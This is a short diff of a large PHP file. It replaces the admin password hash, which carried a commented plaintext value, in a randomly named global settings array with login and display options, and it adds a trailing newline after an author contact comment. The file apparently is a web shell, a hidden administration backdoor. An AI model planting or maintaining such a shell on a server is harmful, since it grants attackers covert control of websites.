@@ -2,7 +2,7 @@
 
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'admin',
-    'password' => '9c983d1fc5500dce0b8f78e698372b8a',//md5(ehsan)
+    'password' => '9e4f9620e23b9d3c55ef688a237f3e63',
     'safe_mode' => '1',
     'login_page' => 'gui',
     'show_icons' => '1',
@@ -6519,3 +6519,4 @@ exit;
 #skype : ehsan.invisible
 */
 ?>
+
